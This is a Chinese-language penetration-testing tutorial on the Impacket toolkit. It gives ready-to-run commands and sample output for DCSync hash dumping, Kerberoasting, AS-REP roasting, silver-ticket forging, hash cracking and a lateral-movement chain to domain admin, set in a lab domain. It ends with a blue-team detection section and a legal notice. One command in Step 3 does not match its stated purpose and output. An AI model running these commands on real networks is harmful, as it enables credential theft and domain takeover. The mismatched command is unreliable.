# Impacket（Windows 协议攻击工具箱）

> **一句话**：一套用 Python 实现的 SMB/MSRPC/Kerberos/WMI 协议库，附带一批「一条命令打完整个 AD 攻击链」的脚本：抓哈希、拿票据、远程执行、横向移动。
> **分类**：后渗透 / 凭据访问 / 横向移动 ｜ **Kali 包**：`python3-impacket`（安装后生成 `impacket-*` 系列命令）｜ **官方文档**：<https://github.com/fortra/impacket>

---

## 1. 它解决什么问题

打进 Windows 域环境后，几乎所有动作都绕不开这几件事：**读凭据**、**用凭据**、**在远程主机上执行命令**。原生的 `net use`、`psexec`、PowerShell 都要么功能弱、要么必须在 Windows 上跑。

Impacket 提供的是**在 Linux 上以纯 Python 直接说 Windows 的协议**：

| 你要做的事 | 对应脚本 |
|------------|----------|
| 从远程主机抓 SAM/LSA/NTDS.dit | `impacket-secretsdump` |
| 用明文/哈希/NTLM 远程执行 | `impacket-psexec` / `impacket-wmiexec` / `impacket-smbexec` / `impacket-atexec` / `impacket-dcomexec` |
| Kerberos 攻击 | `impacket-GetUserSPNs`（Kerberoasting）、`impacket-GetNPUsers`（AS-REP Roasting）、`impacket-getTGT` / `impacket-getST`（票据申请/委派滥用）、`impacket-ticketer`（伪造黄金/白银票据） |
| 中继与投毒 | `impacket-ntlmrelayx` |
| 访问共享文件 | `impacket-smbclient` |
| 建机器账户 / 改 ACL | `impacket-addcomputer` / `impacket-dacledit` / `impacket-owneredit` / `impacket-rbcd` |
| 本地起 SMB 服务器（收文件/托管 payload） | `impacket-smbserver` |

与同类对比：

- **vs `crackmapexec`/`netexec`**：NetExec 擅长**批量枚举与喷洒**（一个网段一次跑完），Impacket 擅长**单点精确操作**（指定用户抓 NTDS、伪造票据）。实战里两者互相配合。
- **vs `mimikatz`/`pypykatz`**：Mimikatz 在 **Windows 本机**内存里抓凭据；Impacket 在 **Linux 远程**通过 DCSync/DRSUAPI 拉域内哈希。见 [`mimikatz.md`](mimikatz.md)。
- **vs `evil-winrm`**：Evil-WinRM 只做 WinRM 一种通道，Impacket 覆盖 SMB/WMI/DCOM/MSRPC 多种通道。见 [`evil-winrm.md`](evil-winrm.md)。

---

## 2. 工作原理

### 2.1 Windows 认证协议速览

| 协议 | 机制 | 攻击意义 |
|------|------|----------|
| **NTLM** | 挑战-应答（challenge/response）。客户端用 `NT hash = MD4(密码)` 参与计算，**哈希本身即可用于认证**（Pass-the-Hash） | 拿到 NT hash 等于拿到密码（无需破解） |
| **Kerberos** | 三方票据体系：AS-REQ→TGT，TGS-REQ→Service Ticket。票据用服务账号的密钥加密 | 可离线破解票据（Kerberoasting / AS-REP Roasting）、可伪造票据（Golden/Silver Ticket） |
| **Net-NTLMv2** | NTLM 的网络响应，**不能**直接用于 PTH，需离线破解 | Responder/ntlmrelayx 的核心目标 |

关键概念：**LM hash / NT hash / Net-NTLMv2 / Kerberos 票据** 是四种不同东西，用法完全不同，别混。

### 2.2 凭据从哪里来

| 来源 | 内容 | Impacket 的取法 |
|------|------|-----------------|
| **SAM**（`C:\Windows\System32\config\SAM`） | 本地账户 NT hash | `secretsdump -sam`，或 PTH 后远程注册表读 |
| **LSA Secrets / SECURITY** | 服务账号、缓存域凭据、DPAPI 相关内容 | `secretsdump -security` |
| **NTDS.dit**（域控上的 AD 数据库） | **全域**用户/机器/服务账号的 NT hash、Kerberos 密钥 | `secretsdump -just-dc`（走 **DRSUAPI/DCSync**，不落地文件） |
| **LSASS 内存** | 明文密码、票据、hash | `mimikatz` / `pypykatz`（本地），不是 Impacket 的活 |

DCSync 原理：模拟域控之间复制数据的 `DSGetNCChanges` 请求，**只需 `Replicating Directory Changes` 权限**（域管/DC 机器账户/被授权的账户），就能把 NTDS.dit 内容「同步」到本地，**不写文件、不触发文件落地检测**，但对 4662 事件敏感。

### 2.3 远程执行通道

| 通道 | 脚本 | 原理 | 落地文件 | 隐蔽性 |
|------|------|------|----------|--------|
| **PsExec** | `impacket-psexec` | 上传服务可执行文件 → 建并启动服务 → 输出重定向到命名管道 | 是（`ADMIN$`） | 低（服务创建有日志） |
| **SMBExec** | `impacket-smbexec` | 建服务但命令通过 `cmd.exe /Q /c` 写输出到共享文件 | 是 | 中 |
| **WMI** | `impacket-wmiexec` | `Win32_Process.Create` 创建进程，输出写共享 | 否（半交互） | 中高 |
| **DCOM** | `impacket-dcomexec` | 通过 DCOM（MMC20/MQ/etc）创建进程 | 否 | 高（少见） |
| **Atexec** | `impacket-atexec` | 通过任务计划服务创建一次性任务 | 否 | 中 |
| **WinRM** | `evil-winrm` | WS-Man + PSRP，走 5985/5986 | 否 | 中 |

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install python3-impacket
ls /usr/bin/impacket-* | wc -l          # 查看全部脚本（Kali 用 impacket- 前缀提供入口）
```

> Kali 的官方文档页只列了 `impacket-netview`、`impacket-rpcdump`、`impacket-samrdump`、`impacket-secretsdump`、`impacket-wmiexec` 这几个代表命令，**实际安装的远不止这些**。用上面 `ls` 命令确认真实全集，本文后续命令均按 `impacket-<脚本名>` 形式给出。

通用连接串格式（记住这一条就能用一半脚本）：

```
[[domain/]username[:password]@]<targetName or address>
```

示例：

```bash
impacket-secretsdump -h
```

```console
# 明文密码
impacket-secretsdump 'CONTOSO/Administrator:Passw0rd!'@10.10.10.10

# NT hash（Pass-the-Hash，用 : 分隔 LM:NT，LM 可留空）
impacket-secretsdump -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' 'CONTOSO/Administrator'@10.10.10.10

# Kerberos 票据（先用 getTGT 拿 ccache）
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass dc01.contoso.com
```

---

## 4. 核心参数详解

### 4.1 通用参数（几乎所有脚本都有）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-hashes LMHASH:NTHASH` | 使用 NT hash 认证（PTH） | LM 部分写空即可：`-hashes :NTHASH` |
| `-no-pass` | 不提示密码 | 配合 `-k` + ccache 使用 |
| `-k` | 使用 Kerberos 认证 | 必须能用域名的 **FQDN**，且 `/etc/hosts` 指向 DC，`/etc/krb5.conf` 配好 realm |
| `-dc-ip <ip>` | 指定域控地址 | Kerberos 场景**必填**（域名无法解析时） |
| `-target-ip <ip>` | 指定目标真实 IP | 域名与 IP 不一致时用 |
| `-debug` | 打印调试信息 | 排错神器，会显示原始 RPC/SMB 交互 |
| `-ts` / `-codec` | 时间戳 / 输出编码 | 中文乱码时改 `-codec utf-8` |
| `-outputfile <f>` | 结果写文件 | 抓哈希必备，便于后续 hashcat |

### 4.2 `impacket-secretsdump`（最重要）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-just-dc` | 只导出 NTDS.dit 内容（DCSync） | 拿域名管账号后首选 |
| `-just-dc-ntlm` | 只导出 NTLM 哈希（跳过 Kerberos 密钥） | 输出更干净 |
| `-just-dc-user <user>` | 只导出指定用户 | **按需最小化抓取**，降低日志噪音 |
| `-just-dc-user krbtgt` | 只取 `krbtgt` 哈希 | 伪造黄金票据的前提 |
| `-sam` / `-security` / `-system` | 本地注册表 hive 文件模式 | **离线/离线取证**场景（已有 hive 文件时） |
| `-history` | 包含密码历史 | 找旧密码复用时用 |
| `-use-vss` | 用卷影副本读 NTDS.dit | **非 DCSync** 路径，需域管且会落地临时文件 |
| `-ntds <file>` + `-system <file>` | 从已导出的文件解析 | 离线分析 `NTDS.dit` |
| `-users <file>` | 限定用户列表 | 精细化操作 |
| `-pwd-last-set` / `-user-status` | 附带密码修改时间 / 账号状态 | 找「长期未改密」与「已禁用但仍可用」的账号 |
| `-exec-method <smbexec\|wmiexec>` | 指定远程取 hive 的方式 | 默认 smbexec |

### 4.3 远程执行类

| 参数 | 脚本 | 作用 |
|------|------|------|
| `-service-name <name>` | psexec/smbexec | 自定义服务名（规避按名匹配的告警） |
| `-share <name>` | wmiexec | 指定输出共享（默认 `ADMIN$`） |
| `-shell-type <cmd\|powershell>` | psexec/wmiexec | 选择解释器 |
| `-codec <enc>` | psexec/wmiexec | 输出编码（中文 Windows 用 `gbk`） |
| `-silentcommand` | wmiexec | 不等待输出（配合 `-i` 用） |

### 4.4 Kerberos 攻击类

| 脚本 | 关键参数 | 作用 |
|------|----------|------|
| `impacket-GetUserSPNs` | `-request`、`-request-user <u>`、`-outputfile`、`-users-file`、`-dc-ip` | **Kerberoasting**：请求服务票据，拿回来离线爆破 |
| `impacket-GetNPUsers` | `-no-pass`、`-request`、`-format hashcat\|john`、`-users-file`、`-dc-ip` | **AS-REP Roasting**：针对「不需预认证」的账户 |
| `impacket-getTGT` | `-hashes`、`-aesKey`、`-dc-ip` | 用 hash/密钥换 TGT（`.ccache`） |
| `impacket-getST` | `-spn`、`-impersonate`、`-hashes` | 申请服务票据（可做 **S4U 委派滥用**） |
| `impacket-ticketer` | `-nthash`、`-domain-sid`、`-user-id`、`-groups`、`-duration` | 伪造**黄金/白银票据** |
| `impacket-ticketConverter` | `ticket.kirbi ticket.ccache` | kirbi ↔ ccache 互转（Windows↔Linux） |
| `impacket-findDelegation` | `-target-domain` | 找配置了委派的账户（横向路径发现） |
| `impacket-ntlmrelayx` | `-t <target>`、`-tf <file>`、`-smb2support`、`-socks`、`-of <file>`、`-l <dir>`、`-c <cmd>`、`-e <exe>`、`-wh <host>` | 中继 NTLM 到别的服务，直接落地凭据/命令 |

---

## 5. 实战演练

> **环境声明**：以下全部在**自建 AD 靶场**中进行。推荐两种搭建方式：① 自建 Windows Server 2016/2019 域控 + 2 台域内主机（**Host-Only 网络**）；② 使用 **GOAD**（Game of Active Directory，开源 AD 靶场，docker/vagrant 一键起）。示例域 `CONTOSO.LOCAL`，DC `10.10.10.10`，攻击机 Kali `10.10.10.5`。
> **绝对禁止对未授权的域环境执行这些操作。** 抓取凭据、伪造票据都是高危行为。

### 场景 1：从一条口令到全域哈希（secretsdump 的三种用法）

**Step 1：先做最克制的操作——只取自己需要的那个用户**

```bash
impacket-secretsdump -just-dc-user krbtgt \
  'CONTOSO/Administrator:Passw0rd!'@10.10.10.10
```

```console
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x9016528b8e07d2b4b8a5e4d3c2b1a0f9
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f1e2d3c4b5a6978877665544332211fa:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:8b7c6d5e...
[*] Cleaning up...
```

**解读**：`Using the DRSUAPI method` 就是 **DCSync**；格式是 `用户名:RID:LM:NT:::`；`Kerberos keys grabbed` 给出 AES 密钥——伪造黄金票据时优先用 AES 而不是 RC4（更隐蔽）。

**Step 2：需要更多账号时，按需扩大并落盘**

```bash
impacket-secretsdump -just-dc-ntlm -outputfile /tmp/ntds_ntlm \
  'CONTOSO/Administrator:Passw0rd!'@10.10.10.10
wc -l /tmp/ntds_ntlm.ntds
```

**Step 3：没有域管，只有一台普通主机的本地管理员（PTH 抓本地哈希 + LSA）**

```bash
impacket-secretsdump -hashes ':aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' \
  -outputfile /tmp/loot -just-dc 'CONTOSO/svc_backup'@10.10.10.20
```

```console
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
CONTOSO\DC01$:aes256-cts-hmac-sha1-96:...
[*] DPAPI_SYSTEM
dpapi_machinekey:0x...
```

**解读**：`Dumping local SAM hashes` → 本地账户；`Dumping LSA Secrets` → 机器账户密钥（**可用来做白银票据/计算机账号滥用**）与 DPAPI 密钥。`$MACHINE.ACC` 里的机器账号凭据是后续很多攻击的关键。

**Step 4：离线解析（取证/无网络场景）**

```bash
# 已有从镜像中提取的 hive 文件
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# 已有 NTDS.dit + SYSTEM
impacket-secretsdump -ntds NTDS.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### 场景 2：Kerberos 攻击三连（Kerberoasting / AS-REP / 白银票据）

```bash
# ① Kerberoasting：只要有一个普通域用户凭据即可
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 \
  'CONTOSO/jdoe:Summer2024!' -outputfile /tmp/kerberoast.txt
```

```console
ServicePrincipalName              Name        MemberOf       PasswordLastSet
--------------------------------  ----------  -------------  -------------------
MSSQLSvc/db01.contoso.local:1433  svc_mssql                  2023-01-11 09:12:44
$krb5tgs$23$*svc_mssql$CONTOSO.LOCAL$MSSQLSvc/db01...$8f3a...
```

```bash
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

**解读**：`$krb5tgs$23$` 是 RC4 加密的 TGS 票据哈希，`-m 13100` 对应破解模式。**服务账号口令弱就能离线爆破出来**——这就是 Kerberoasting 的全部意义。

```bash
# ② AS-REP Roasting：找「不需 Kerberos 预认证」的账户
impacket-GetNPUsers -dc-ip 10.10.10.10 -no-pass -request \
  -users-file /tmp/domain_users.txt -format hashcat -outputfile /tmp/asrep.txt
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt
```

**解读**：`$krb5asrep$` 前缀；这类账户任何**未认证**的攻击者都能请求到可离线爆破的票据，属于严重配置错误（UF_DONT_REQUIRE_PREAUTH）。

```bash
# ③ 用刚破解出的服务账号哈希伪造白银票据（伪造的是「访问某服务」的票据）
impacket-ticketer -nthash <svc_mssql_NT_hash> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -domain contoso.local -spn MSSQLSvc/db01.contoso.local:1433 svc_mssql
export KRB5CCNAME=svc_mssql.ccache
impacket-mssqlclient -k -no-pass db01.contoso.local
```

**解读**：白银票据 = 用**服务账号密钥**签的 TGS，只对**该 SPN** 有效；黄金票据（用 `krbtgt` 哈希签 TGT）才能全域通行。二者都需要先拿到对应密钥——`secretsdump` 正是这些密钥的来源。

### 场景 3：完整横向链条（低权限 shell → 域管）

假设已通过 Web 漏洞拿到域内主机 `WEB01`（`10.10.10.20`）的 `iis` 服务账号 shell：

```console
# ① 用密码喷洒找到可登录的账号（批量枚举交给 NetExec，见 netexec.md）
$ impacket-GetADUsers -all -dc-ip 10.10.10.10 'CONTOSO/jdoe:Summer2024!'
Name                Email                  PasswordLastSet      LastLogon
------------------  ---------------------  -------------------  -----------
Administrator                              2024-03-02 10:11:03  2024-05-01 08:22:31
svc_backup                                2023-11-05 14:02:11  <never>
```

```bash
# ② 对可疑服务账号做 Kerberoasting 并破解
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 'CONTOSO/jdoe:Summer2024!' -outputfile /tmp/kb.txt
hashcat -m 13100 /tmp/kb.txt /usr/share/wordlists/rockyou.txt --force
# => svc_backup : Backup2023!
```

```bash
# ③ 判断这个账号在哪些主机上能登录（批量，交给 NetExec）
nxc smb 10.10.10.0/24 -u svc_backup -p 'Backup2023!' --continue-on-success

# ④ 在可登录主机上执行命令（WMI 通道，较少落文件）
impacket-wmiexec 'CONTOSO/svc_backup:Backup2023!'@10.10.10.30 'whoami /all'

# ⑤ 发现该账号对 DC 有复制权限 → DCSync
impacket-secretsdump -just-dc-ntlm -outputfile /tmp/domain 'CONTOSO/svc_backup:Backup2023!'@10.10.10.10
head -3 /tmp/domain.ntds
```

```console
Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**解读**：这就是 AD 的典型「一条弱口令 → 域管」路径。每一环都对应一个 Impacket 脚本：**枚举 `GetADUsers` → 票据 `GetUserSPNs` → 执行 `wmiexec` → 复制 `secretsdump`**。批量环节交给 [`netexec.md`](netexec.md)，隧道环节交给 [`chisel.md`](chisel.md)。

---

## 6. 输出解读

| 输出片段 | 含义 | 下一步 |
|----------|------|--------|
| `Target system bootKey: 0x...` | 成功读取 SYSTEM hive 的 boot key | 后续解密所需，说明通道打通 |
| `Using the DRSUAPI method to get NTDS.DIT secrets` | **DCSync 生效** | 已拿到域内全部哈希 |
| `:::`（三段空） | 该账号密码为空或已禁用无 hash | 小心误用 |
| `aad3b435b51404eeaad3b435b51404ee` | **空 LM hash**（现代 Windows 正常现象） | 用 `:NTHASH` 形式做 PTH |
| `$krb5tgs$23$` / `$krb5asrep$23$` | 可离线爆破的票据哈希 | `hashcat -m 13100` / `-m 18200` |
| `Kerberos keys grabbed` 里的 `aes256-cts-hmac-sha1-96` | AES 密钥（更隐蔽的票据伪造材料） | 伪造票据优先用 AES |
| `[*] Cleaning up...` | 清理了远程服务/文件 | secretsdump 的正常收尾 |
| `STATUS_LOGON_FAILURE` | 凭据错误/被锁 | 停手，避免触发锁定策略 |
| `STATUS_ACCESS_DENIED` | 权限不足 | 换账号或换通道（WMI↔PsExec） |
| `KRB_AP_ERR_SKEW` | 时间偏差 > 5 分钟 | 与 DC 对时：`sudo ntpdate dc` 或 `timedatectl` |
| `rpc_s_access_denied` | 无 `Replicating Directory Changes` 权限 | 需要域管/DC 机器账户/被授权账号 |

---

## 7. 与其他工具配合

```
① 侦察      nmap / netexec 枚举  ──► 有效凭据、主机、共享、委派配置
                                        │
② 抓凭据    impacket-secretsdump ◄──────┤（PTH / DCSync）
                                        │  mimikatz / pypykatz（本地 LSASS）
                                        ▼
③ 破解      hashcat -m 1000(NT) / 13100(kirbi) / 18200(asrep) / 5500(NetNTLMv2)
                                        │
④ 复用      netexec 批量验证 ──► impacket-wmiexec/psexec 单点执行 ──► evil-winrm 交互
                                        │
⑤ 隧道      chisel / ligolo-ng / proxychains4 → 打更深的内网
                                        │
⑥ 提权      被控 Windows 上 → winpeas / PowerUp / PrintNightmare 等
```

- 批量验证与喷洒：[`netexec.md`](netexec.md)、[`crackmapexec.md`](crackmapexec.md)
- 攻击路径可视化：[`bloodhound.md`](bloodhound.md)
- 本机凭据抓取：[`mimikatz.md`](mimikatz.md)
- 隧道：[`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)、[`proxychains4.md`](proxychains4.md)
- 破解：[`../04-口令攻击/`](../04-口令攻击/)
- 中继目标（SMB/LDAP 签名关闭）：`impacket-ntlmrelayx` + [`../07-嗅探与欺骗/`](../07-嗅探与欺骗/) 里的 Responder

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `SMB signing required` / `STATUS_ACCESS_DENIED` 但凭据是对的 | 目标强制 SMB 签名 | PTH 走 **WMI/WinRM/Kerberos** 通道，别用 SMB 通道 |
| `KRB_AP_ERR_SKEW(Clock skew too great)` | 时间偏差 > 5 分钟 | `sudo ntpdate <dc>` / `sudo timedatectl set-ntp true` |
| `-k` 报 `Cannot find KDC for realm` | 域名没解析到 DC | `/etc/hosts` 加 `10.10.10.10 dc01.contoso.local contoso.local`；`/etc/krb5.conf` 配 `default_realm` |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN 写错，或用了 IP 而非 FQDN | Kerberos 必须用 **FQDN** + `-dc-ip` |
| `pip install impacket` 后命令混乱/报 `ModuleNotFoundError` | 与系统包 `python3-impacket` 冲突（**Kali 上最常见的坑**） | 卸载 pip 版本，统一用 `sudo apt install python3-impacket`；确需新版用 `python3 -m venv` 隔离 |
| 命令名 `secretsdump.py` 找不到 | Kali 用入口点而非 .py 文件 | 用 `impacket-secretsdump`；或 `ls /usr/share/doc/python3-impacket/examples/` 找示例源码路径 |
| `NT_STATUS_PIPE_NOT_AVAILABLE` | 目标禁用远程注册表/服务管理 | 换 `-use-vss`，或直接走 DCSync（`-just-dc`） |
| `DRSR SessionError: code: 0x2107` | DCSync 权限不足 | 需要域管/DC 机器账户；先做 BloodHound 找路径 |
| PsExec 成功但无回显 | 服务输出管道未建立/被杀软拦 | 换 `wmiexec`；`-debug` 看细节 |
| 中文输出乱码 | 编码不匹配 | `-codec gbk` |
| `STATUS_ACCOUNT_LOCKED_OUT` | 触发账户锁定策略 | **立即停止**，先查锁定阈值再继续 |
| 目标 EDR 报毒/阻断 | PsExec 类工具被特征识别 | 属正常检测；授权测试应记录该响应 |

---

## 9. 防御视角（蓝队）

| 攻击手法 | 检测信号 | 缓解措施 |
|----------|----------|----------|
| **DCSync** | 事件 **4662**（对域对象复制权限的访问）、非 DC 主机发起 DRSUAPI 复制 | 收紧 `Replicating Directory Changes` 权限（含 All）、监控 4662、启用 **Advanced Audit** |
| **Kerberoasting** | 事件 **4769**（大量 TGS 请求，加密类型 `0x17`/RC4）、请求来源非服务主机 | 服务账号改 **gMSA**（密码自动 120 位轮换）、强制 AES、监控 4769 的 RC4 |
| **AS-REP Roasting** | 事件 **4768** 且 `Pre-Authentication Type = 0` | 消除「不需预认证」账户（`UF_DONT_REQUIRE_PREAUTH`） |
| **Pass-the-Hash** | 事件 **4624 类型 3**（网络登录）且 `NTLM`、同一账号多主机短时间登录 | **禁用 NTLM**（域内可 NDES/审计模式过渡）、**LAPS** 让本地管理员密码唯一、Credential Guard |
| **PsExec/SMBExec** | 事件 **7045**（新服务安装）、`ADMIN$` 下的可执行文件落地、4697 | 限制本地管理员、EDR 服务创建告警、禁用 `ADMIN$` 写入（受限） |
| **WMI/DCOM 远程执行** | 事件 **4688** 父进程为 `WmiPrvSE.exe`/`mmc.exe`、`Win32_Process.Create` 审计 | Windows 防火墙限制 WMI/DCOM 入站、监控异常父进程 |
| **黄金/白银票据** | 事件 **4769** 中 `krbtgt` 使用异常、票据有效期异常（黄金票据默认 10 年） | 定期**两次**重置 `krbtgt` 密码、监控异常 TGT 生命周期 |
| **NTLM 中继** | SMB/LDAP 未签名的认证请求来自非预期主机、`Responder` 特征（`SMB`/`HTTP` 监听） | **强制 SMB 签名 + LDAP 签名/通道绑定**、关闭 LLMNR/NBT-NS/mDNS、EPA（Extended Protection for Authentication） |
| 凭据落地被读取 | 4663/4656 访问 SAM/SECURITY 注册表项 | LSASS 保护（RunAsPPL / Credential Guard）、限制注册表远程访问 |

**优先级最高的三条**：**SMB 签名 + 禁用 NTLM + LAPS**。这三条能一次性废掉「中继 + PTH + 本地管理员口令复用」这整条链。

---

## 10. 参考

- Impacket 官方仓库（含每个脚本的 `--help` 与示例）：<https://github.com/fortra/impacket>
- Kali 工具页（impacket）：<https://www.kali.org/tools/impacket/>
- DCSync 原理（MITRE ATT&CK T1003.006）：<https://attack.mitre.org/techniques/T1003/006/>
- Kerberoasting（T1558.003）：<https://attack.mitre.org/techniques/T1558/003/>
- 本地命令：`impacket-secretsdump -h`、`impacket-GetUserSPNs -h`、`ls /usr/bin/impacket-*`

## ⚠️ 法律与伦理

Impacket 是纯粹的**攻击性工具**，其绝大多数功能（DCSync、票据伪造、NTLM 中继）在未授权环境下使用**必然构成犯罪**：可能触犯《刑法》第 285 条（非法获取计算机信息系统数据、非法控制计算机信息系统）、第 286 条，以及《网络安全法》《数据安全法》《个人信息保护法》相关条款。

本教程仅用于：**书面授权的渗透测试与红队演练、CTF 竞赛、自建 AD 靶场（如 GOAD）、蓝队检测能力验证**。请在隔离网络中操作，测试结束后清理凭据与票据文件，报告中的哈希与明文密码须脱敏处理。
